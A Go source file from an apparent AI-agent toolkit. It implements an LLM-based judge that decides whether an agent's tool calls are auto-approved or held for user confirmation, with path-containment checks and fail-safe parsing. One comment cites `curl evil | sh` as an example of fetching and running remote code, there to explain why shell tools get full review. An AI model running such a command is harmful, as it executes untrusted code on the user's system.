package tools

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"log/slog"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/v0lka/sp4rk/llm"
	"github.com/v0lka/sp4rk/strutil"
	"github.com/v0lka/sp4rk/tools/internal/judge_prompts"
)

// pathRegex matches absolute path-like substrings in command strings.
// Matches POSIX-style absolute paths and Windows drive-letter paths
// (e.g. C:\foo\bar or D:/baz).
var pathRegex = regexp.MustCompile(`(?:/[a-zA-Z0-9/_.\-~]+|[A-Za-z]:[\\/][A-Za-z0-9\\/_.\-~]*)`)

// judgeUnparsedReason is the fail-safe reasoning returned when the LLM
// response cannot be parsed at all. Kept as a constant so callers (and tests)
// can detect a total parse failure.
const judgeUnparsedReason = "Unable to parse judge response; requiring manual confirmation for safety"

// The following regexes make parseJudgeResponse tolerant of the formatting
// variations LLMs commonly produce despite the requested two-line format.
var (
	// judgeListPrefixRe matches a leading markdown list marker ("- ", "* ",
	// "+ ", "1. ") so such lines are still recognized as key/value pairs.
	judgeListPrefixRe = regexp.MustCompile(`^(?:[-*+]|\d+\.)\s+`)
	// judgeKeyRe matches a "KEY: value" or "KEY = value" pair at the start of a
	// (markdown-stripped) line. The key is matched case-insensitively and
	// accepts both VERDICT and REASON/REASONING aliases.
	judgeKeyRe = regexp.MustCompile(`(?i)^(verdict|reason(?:ing)?)\s*[:=]\s*(.*)$`)
	// judgeReasonInlineRe locates an inline REASON key within a VERDICT line
	// value, e.g. "ALLOW — REASON: safe" so a single-line answer is parsed.
	judgeReasonInlineRe = regexp.MustCompile(`(?i)\breason(?:ing)?\s*[:=]\s*(.*)$`)
	// judgeJSONRe extracts a JSON object possibly embedded in prose, for models
	// that emit {"verdict":"ALLOW","reason":"..."} despite the format request.
	judgeJSONRe = regexp.MustCompile(`(?s)\{.*\}`)
)

// JudgeVerdict represents the safety assessment of a tool call.
type JudgeVerdict int

const (
	// VerdictAllow indicates the tool call is safe to auto-approve.
	VerdictAllow JudgeVerdict = iota
	// VerdictConfirm indicates the tool call needs user confirmation.
	VerdictConfirm
)

// judgeResult holds both verdict and reasoning for caching.
type judgeResult struct {
	verdict   JudgeVerdict
	reasoning string
}

// ToolJudge evaluates whether a mutating tool call is safe to auto-approve.
// It maintains an LRU-style cache keyed by tool+input to avoid redundant LLM calls.
type ToolJudge struct {
	provider     llm.Provider
	model        string
	systemPrompt string            // judge system prompt (defaults to judge_prompts.JudgeSystem)
	isInternalFn func(string) bool // returns true for internal tools that bypass the judge
	cache        map[string]judgeResult
	mu           sync.RWMutex
	maxCacheSize int // max cached results before cache is cleared (default: 1000)
	logger       *slog.Logger
}

// NewToolJudge creates a new ToolJudge with the given LLM provider and model.
// If maxCacheSize is 0, defaults to 1000. Logger may be nil.
func NewToolJudge(provider llm.Provider, model string, maxCacheSize int, logger *slog.Logger) *ToolJudge {
	if maxCacheSize == 0 {
		maxCacheSize = 1000
	}
	return &ToolJudge{
		provider:     provider,
		model:        model,
		systemPrompt: judge_prompts.JudgeSystem,
		isInternalFn: func(string) bool { return false }, // default: no internal tools
		cache:        make(map[string]judgeResult),
		maxCacheSize: maxCacheSize,
		logger:       logger,
	}
}

// SetSystemPrompt sets the system prompt for the judge. If empty, uses the default.
func (j *ToolJudge) SetSystemPrompt(prompt string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	if prompt != "" {
		j.systemPrompt = prompt
	} else {
		j.systemPrompt = judge_prompts.JudgeSystem
	}
}

// SetIsInternalFn sets the function that determines if a tool name is internal
// (always allowed, bypasses judge). Defaults to a function that always returns false.
func (j *ToolJudge) SetIsInternalFn(fn func(string) bool) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.isInternalFn = fn
}

// judgeCacheKey generates a cache key from tool name and input.
func judgeCacheKey(toolName string, input json.RawMessage) string {
	h := sha256.Sum256(input)
	return toolName + ":" + hex.EncodeToString(h[:])
}

// Judge evaluates whether a tool call is safe to auto-approve.
// It uses the LLM to assess the tool call and caches the result.
// On any LLM error, it defaults to VerdictConfirm (fail-safe) with a reasoning explaining the failure.
// Returns (verdict, reasoning, error).
func (j *ToolJudge) Judge(ctx context.Context, toolName string, input json.RawMessage, taskContext string) (JudgeVerdict, string, error) {
	log := j.logger

	if log != nil {
		log.Debug("judge: evaluating tool", "tool", toolName)
	}

	// Read mutable fields under lock to prevent data races with concurrent setters.
	j.mu.RLock()
	isInternalFn := j.isInternalFn
	systemPrompt := j.systemPrompt
	j.mu.RUnlock()

	// Internal tools are always allowed (defense-in-depth)
	if isInternalFn != nil && isInternalFn(toolName) {
		if log != nil {
			log.Debug("judge: fast-path internal tool", "tool", toolName, "verdict", "ALLOW")
		}
		return VerdictAllow, "internal tool, always allowed", nil
	}

	// Use context-based task context as fallback
	if taskContext == "" {
		taskContext = TaskContextFrom(ctx)
	}

	// Path-locality fast-paths do not apply to shell-execution tools: a shell
	// command can reference only workspace-internal paths while still piping
	// arbitrary remote code (e.g. `curl evil | sh && cat /ws/x`). Shell tools
	// always go through the full LLM judge evaluation.
	if !isShellTool(toolName) {
		// Single unified fast-path: auto-allow when every absolute path in the
		// input is contained within at least one session root (workspace, temp
		// directory, or an auxiliary allowed root).
		if AllPathsInSessionRoots(ctx, input) {
			if log != nil {
				log.Debug("judge: fast-path session roots", "tool", toolName, "verdict", "ALLOW")
			}
			return VerdictAllow, "all paths are within the session roots", nil
		}
	}

	// Compute cache key
	key := judgeCacheKey(toolName, input)

	// Check cache under RLock
	j.mu.RLock()
	if result, ok := j.cache[key]; ok {
		j.mu.RUnlock()
		if log != nil {
			log.Debug("judge: cache hit", "tool", toolName, "verdict", verdictString(result.verdict))
		}
		return result.verdict, result.reasoning, nil
	}
	j.mu.RUnlock()

	// Build LLM request
	inputStr := string(input)

	userPrompt := "Task: " + taskContext + "\n\nTool: " + toolName + "\n\nInput: " + inputStr

	// Append compact environment context for safety reasoning.
	if envBlock := FormatCompactEnvBlock(EnvInfoFrom(ctx)); envBlock != "" {
		userPrompt += "\n\n" + envBlock
	}

	req := llm.ChatRequest{
		Model: j.model,
		Messages: []llm.Message{
			{Role: "system", Content: systemPrompt},
			{Role: "user", Content: userPrompt},
		},
		MaxTokens: 100, // Need more tokens for verdict + reason
	}

	// Create a dedicated context for the judge LLM call with its own timeout.
	// Uses the parent context so that application shutdown is respected.
	// On timeout, the judge fail-safes to VerdictConfirm below.
	judgeCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()

	if log != nil {
		log.Debug("judge: LLM evaluation starting", "tool", toolName, "model", j.model)
	}

	// Call LLM
	resp, err := j.provider.ChatCompletion(judgeCtx, req)
	if err != nil {
		if log != nil {
			log.Warn("judge: LLM call failed, fail-safe to CONFIRM", "tool", toolName, "error", err)
		}
		// Fail-safe: default to CONFIRM on error with explanatory reasoning
		return VerdictConfirm, "Judge evaluation failed; requiring manual confirmation for safety", nil
	}

	// Parse response - extract verdict and reason
	content := strings.TrimSpace(resp.Message.Content)
	verdict, reasoning := parseJudgeResponse(content)

	if reasoning == judgeUnparsedReason && log != nil {
		// Surface the raw model output so the unparseable response can be
		// diagnosed instead of disappearing into a generic fail-safe message.
		log.Warn("judge: could not parse LLM response, fail-safe to CONFIRM",
			"tool", toolName, "raw_response", strutil.TruncateUTF8(content, 500))
	}

	if log != nil {
		abbrevReasoning := strutil.TruncateUTF8(reasoning, 120)
		if len(reasoning) > 120 {
			abbrevReasoning += "..."
		}
		log.Debug("judge: LLM verdict", "tool", toolName, "verdict", verdictString(verdict), "reasoning", abbrevReasoning)
	}

	// Cache the result under Lock (evict if cache is too large)
	j.mu.Lock()
	// Aggressive full-clear when cache is full. Acceptable because judge results
	// are cheap to recompute and the cache is a best-effort optimization.
	if len(j.cache) >= j.maxCacheSize {
		if log != nil {
			log.Info("judge: cache full, clearing all entries", "size", len(j.cache), "max", j.maxCacheSize)
		}
		j.cache = make(map[string]judgeResult)
	}
	j.cache[key] = judgeResult{verdict: verdict, reasoning: reasoning}
	j.mu.Unlock()

	return verdict, reasoning, nil
}

// isShellTool reports whether the tool executes arbitrary shell commands.
// Such tools are excluded from path-locality fast-path auto-approval.
func isShellTool(toolName string) bool {
	return toolName == ToolBashExec || toolName == ToolPoshExec
}

// isPathInWorkspace checks if the given absolute path is within the workspace
// directory (the workspace path itself counts as inside). Delegates to
// [IsWithinRoot], which resolves symlinks through the longest existing prefix
// of both paths and folds letter case only when the session flag
// ([CaseInsensitivePathsFrom]) is set — i.e. when the filesystem was detected
// to be case-insensitive (macOS APFS, Windows NTFS). On a case-sensitive
// filesystem (Linux ext4/tmpfs) containment is case-sensitive so distinct-cased
// siblings are not conflated. Fails closed (false) on error.
func isPathInWorkspace(ctx context.Context, absPath, workspacePath string) bool {
	return IsWithinRoot(ctx, workspacePath, absPath)
}

// ExtractJSONStrings recursively extracts all string values from a value
// produced by json.Unmarshal. It traverses maps, slices, and string values.
func ExtractJSONStrings(data any) []string {
	var results []string
	switch v := data.(type) {
	case string:
		results = append(results, v)
	case map[string]any:
		for _, val := range v {
			results = append(results, ExtractJSONStrings(val)...)
		}
	case []any:
		for _, val := range v {
			results = append(results, ExtractJSONStrings(val)...)
		}
	}
	return results
}

// ExtractPaths extracts absolute path-like substrings from a string value.
// A "/" that follows a path-component character is treated as a separator
// inside a relative path (e.g. the "/src" in "frontend/src/main.tsx"), not the
// start of an absolute one — mirroring ResolveShellPathTokens so the shell and
// JSON-input extractors agree on what counts as a path. Windows drive-letter
// alternatives ("C:\...") start with a letter and are unaffected.
func ExtractPaths(s string) []string {
	var out []string
	for _, m := range pathRegex.FindAllStringIndex(s, -1) {
		start := m[0]
		if s[start] == '/' && start > 0 && isPathComponentChar(s[start-1]) {
			continue
		}
		out = append(out, s[start:m[1]])
	}
	return out
}

// AllPathsInDir returns true if the JSON input contains at least one absolute
// path and every such path is within the specified directory. Containment
// respects the session case-sensitivity flag (see [CaseInsensitivePathsFrom]):
// case-insensitive filesystems fold letter case, case-sensitive ones do not.
func AllPathsInDir(ctx context.Context, input json.RawMessage, dir string) bool {
	if dir == "" {
		return false
	}

	var parsed any
	if err := json.Unmarshal(input, &parsed); err != nil {
		return false
	}

	strValues := ExtractJSONStrings(parsed)
	var allPaths []string
	for _, s := range strValues {
		allPaths = append(allPaths, ExtractPaths(s)...)
	}

	if len(allPaths) == 0 {
		return false
	}

	for _, p := range allPaths {
		cleaned := filepath.Clean(p)
		if !isPathInWorkspace(ctx, cleaned, dir) {
			return false
		}
	}
	return true
}

// AllPathsInWorkspace returns true if the JSON input contains at least one absolute
// path and every such path is within the workspace directory.
func AllPathsInWorkspace(ctx context.Context, input json.RawMessage) bool {
	workspacePath := WorkspacePathFrom(ctx)
	if workspacePath == "" {
		return false
	}
	return AllPathsInDir(ctx, input, workspacePath)
}

// pathInAnyRoot reports whether absPath is contained within at least one of
// the given roots. Reuses [IsWithinRoot] for symlink-aware, case-sensitive-
// aware containment.
func pathInAnyRoot(ctx context.Context, absPath string, roots []string) bool {
	for _, root := range roots {
		if isPathInWorkspace(ctx, absPath, root) {
			return true
		}
	}
	return false
}

// AllPathsInSessionRoots returns true if the JSON input contains at least one
// absolute path and every such path is within at least one of the session
// roots (workspace, temp directory, and any additional allowed roots). This
// is the canonical path-containment check consulted by the judge fast-path.
func AllPathsInSessionRoots(ctx context.Context, input json.RawMessage) bool {
	roots := SessionRoots(ctx)
	if len(roots) == 0 {
		return false
	}

	var parsed any
	if err := json.Unmarshal(input, &parsed); err != nil {
		return false
	}

	strValues := ExtractJSONStrings(parsed)
	var allPaths []string
	for _, s := range strValues {
		allPaths = append(allPaths, ExtractPaths(s)...)
	}

	if len(allPaths) == 0 {
		return false
	}

	for _, p := range allPaths {
		cleaned := filepath.Clean(p)
		if !pathInAnyRoot(ctx, cleaned, roots) {
			return false
		}
	}
	return true
}

// parseJudgeResponse extracts verdict and reasoning from an LLM response.
//
// The judge prompt asks for exactly two lines:
//
//	VERDICT: ALLOW or CONFIRM
//	REASON: <explanation>
//
// In practice LLMs frequently embellish the answer — markdown bold/italics
// ("**VERDICT:** ALLOW"), list markers ("- VERDICT:"), code fences, lowercase
// keys ("Verdict:"), an inline single-line form ("VERDICT: ALLOW — REASON: x"),
// or even JSON. This parser tolerates all of those so a well-reasoned verdict
// is not discarded as "unparseable", while still failing safe (VerdictConfirm)
// when nothing can be recovered.
func parseJudgeResponse(content string) (verdict JudgeVerdict, reasoning string) {
	verdict = VerdictConfirm // default to safe
	reasoning = ""           // empty == "not found"; finalizeJudge fills defaults

	// 1) JSON object fallback (some models ignore the format and emit JSON).
	if v, r, ok := parseJudgeJSON(content); ok {
		return finalizeJudge(v, r)
	}

	// 2) Line-based extraction, tolerant of markdown decorations.
	for _, raw := range strings.Split(content, "\n") {
		line := stripJudgeLineDecoration(raw)
		if line == "" {
			continue
		}
		m := judgeKeyRe.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		key := strings.ToUpper(m[1])
		val := strings.TrimSpace(m[2])

		if key == "VERDICT" {
			// A single line may carry both keys, e.g. "ALLOW | REASON: safe".
			vPart, rPart, hasInline := splitInlineReason(val)
			if v, ok := matchVerdict(vPart); ok {
				verdict = v
			}
			if hasInline && reasoning == "" {
				reasoning = normalizeReason(rPart)
			}
			continue
		}

		// key == "REASON" or "REASONING"
		if reasoning == "" && val != "" {
			reasoning = normalizeReason(val)
		}
	}

	return finalizeJudge(verdict, reasoning)
}

// finalizeJudge applies the documented defaults when no reason was recovered:
// ALLOW gets a positive default; CONFIRM keeps the fail-safe sentinel.
func finalizeJudge(verdict JudgeVerdict, reasoning string) (finalVerdict JudgeVerdict, finalReasoning string) {
	if reasoning == "" {
		if verdict == VerdictAllow {
			return verdict, "Tool call appears safe and relevant to the task"
		}
		return verdict, judgeUnparsedReason
	}
	return verdict, reasoning
}

// stripJudgeLineDecoration removes markdown decorations that would hide a
// leading KEY: prefix: code fences, blockquote markers, list markers, and
// emphasis/bold characters (`*`, `_`, backtick) in the key region (the part
// before the first ':' or '=' separator). Leading/trailing emphasis on the
// value itself is removed later by trimEmphasis (see matchVerdict /
// normalizeReason), so internal emphasis inside a reason is preserved.
func stripJudgeLineDecoration(line string) string {
	line = strings.TrimSpace(line)
	line = strings.TrimPrefix(line, "```")
	line = strings.TrimSuffix(line, "```")
	// Leading blockquote markers.
	line = strings.TrimLeft(line, "> \t")
	// Leading list marker ("- ", "* ", "+ ", "12. ").
	line = judgeListPrefixRe.ReplaceAllString(line, "")
	// Strip emphasis in the key region only (everything up to the separator),
	// so "**VERDICT:**" exposes the VERDICT: prefix. The separator and the
	// free-form value (which may contain colons, e.g. "12:00") are untouched.
	if idx := strings.IndexAny(line, ":="); idx >= 0 {
		deEmph := strings.NewReplacer("*", "", "_", "", "`", "")
		line = deEmph.Replace(line[:idx]) + line[idx:]
	}
	return strings.TrimSpace(line)
}

// trimEmphasis strips leading/trailing whitespace plus markdown emphasis and
// code characters (`*`, `_`, backtick) from a value. Used on verdict and reason
// values so decorative wrapping like "**ALLOW**" or a leading "** " (left by a
// bold key whose closing marker trails the separator) does not corrupt parsing.
func trimEmphasis(s string) string {
	return strings.Trim(s, "*_` \t")
}

// splitInlineReason detects a REASON key embedded in a VERDICT value (e.g.
// "ALLOW — REASON: safe read") and returns the verdict part and reason part.
func splitInlineReason(val string) (verdictPart, reasonPart string, ok bool) {
	loc := judgeReasonInlineRe.FindStringSubmatchIndex(val)
	if loc == nil {
		return val, "", false
	}
	reasonPart = val[loc[2]:loc[3]]
	verdictPart = val[:loc[0]]
	return verdictPart, reasonPart, true
}

// judgeAllowTokens and judgeConfirmTokens are the exact verdict spellings the
// parser recognizes. Matching is whole-token (case-insensitive) rather than
// substring so that negated compounds such as "DISALLOW" and "DISAPPROVE" —
// which contain "ALLOW"/"APPROVE" as substrings but express the opposite
// intent — are never misclassified as ALLOW, which would silently bypass the
// confirmation gate. Such negations instead fail-safe to CONFIRM.
var judgeAllowTokens = map[string]struct{}{
	"ALLOW":    {},
	"ALLOWED":  {},
	"APPROVE":  {},
	"APPROVED": {},
	"SAFE":     {},
}

var judgeConfirmTokens = map[string]struct{}{
	"CONFIRM":    {},
	"CONFIRMED":  {},
	"DENY":       {},
	"DENIED":     {},
	"BLOCK":      {},
	"BLOCKED":    {},
	"DISALLOW":   {},
	"DISAPPROVE": {},
	"REJECT":     {},
	"MANUAL":     {},
}

// matchVerdict classifies a verdict token as ALLOW or CONFIRM. Returns
// ok=false when the token is not recognizable (the caller keeps the safe
// default verdict in that case).
func matchVerdict(val string) (JudgeVerdict, bool) {
	v := strings.ToUpper(strings.TrimSpace(trimEmphasis(val)))
	// Consider only the first whitespace/punctuation-delimited token so inline
	// tails like "ALLOW — REASON: …" or "ALLOW (read-only)" still match.
	if i := strings.IndexAny(v, " \t;|,\n"); i >= 0 {
		v = v[:i]
	}
	v = strings.TrimRight(v, ".:!?")
	if _, ok := judgeAllowTokens[v]; ok {
		return VerdictAllow, true
	}
	if _, ok := judgeConfirmTokens[v]; ok {
		return VerdictConfirm, true
	}
	return VerdictConfirm, false
}

// normalizeReason trims surrounding whitespace and a single layer of matching
// quote/backtick characters from a reason value.
func normalizeReason(val string) string {
	r := trimEmphasis(val)
	if len(r) >= 2 {
		first, last := r[0], r[len(r)-1]
		if (first == '"' && last == '"') || (first == '\'' && last == '\'') || (first == '`' && last == '`') {
			r = strings.TrimSpace(r[1 : len(r)-1])
		}
	}
	return r
}

// parseJudgeJSON attempts to decode a JSON object embedded in the response and
// extract verdict/reason from common key aliases.
func parseJudgeJSON(content string) (verdict JudgeVerdict, reasoning string, ok bool) {
	raw := judgeJSONRe.FindString(content)
	if raw == "" {
		return VerdictConfirm, "", false
	}
	var obj map[string]any
	if err := json.Unmarshal([]byte(raw), &obj); err != nil {
		return VerdictConfirm, "", false
	}
	vStr := firstJSONString(obj, "verdict", "decision", "result")
	rStr := firstJSONString(obj, "reason", "reasoning", "explanation", "justification")
	if vStr == "" && rStr == "" {
		return VerdictConfirm, "", false
	}
	verdict = VerdictConfirm
	if vStr != "" {
		if v, mok := matchVerdict(vStr); mok {
			verdict = v
		}
	}
	return verdict, rStr, true
}

// firstJSONString returns the first non-empty string value found under any of
// the given case-insensitive keys.
func firstJSONString(obj map[string]any, keys ...string) string {
	for _, k := range keys {
		for key, val := range obj {
			if strings.EqualFold(key, k) {
				if s, ok := val.(string); ok && strings.TrimSpace(s) != "" {
					return strings.TrimSpace(s)
				}
			}
		}
	}
	return ""
}

// JudgeConfig holds the settings needed to create a ToolJudge.
type JudgeConfig struct {
	Model        string // specific model for judge; if empty, uses DefaultModel
	DefaultModel string // fallback model from active provider
	Provider     llm.Provider
	MaxCacheSize int               // max cached results before cache is cleared (default: 1000)
	SystemPrompt string            // judge system prompt; if empty, uses judge_prompts.JudgeSystem
	IsInternalFn func(string) bool // returns true for internal tools that bypass the judge
}

// NewToolJudgeFromConfig creates a ToolJudge if properly configured.
// Returns nil if misconfigured. Logs warnings via the provided logger.
func NewToolJudgeFromConfig(cfg JudgeConfig, logger *slog.Logger) *ToolJudge {
	if cfg.Provider == nil {
		return nil
	}

	model := cfg.Model
	if model == "" {
		model = cfg.DefaultModel
	}

	if model == "" {
		if logger != nil {
			logger.Warn("tool judge disabled: no model configured")
		}
		return nil
	}

	judge := NewToolJudge(cfg.Provider, model, cfg.MaxCacheSize, logger)
	if cfg.SystemPrompt != "" {
		judge.SetSystemPrompt(cfg.SystemPrompt)
	}
	if cfg.IsInternalFn != nil {
		judge.SetIsInternalFn(cfg.IsInternalFn)
	}
	if logger != nil {
		logger.Info("tool judge initialized", "model", model)
	}
	return judge
}

// verdictString returns a human-readable string for a JudgeVerdict.
func verdictString(v JudgeVerdict) string {
	switch v {
	case VerdictAllow:
		return "ALLOW"
	case VerdictConfirm:
		return "CONFIRM"
	default:
		return "UNKNOWN"
	}
}
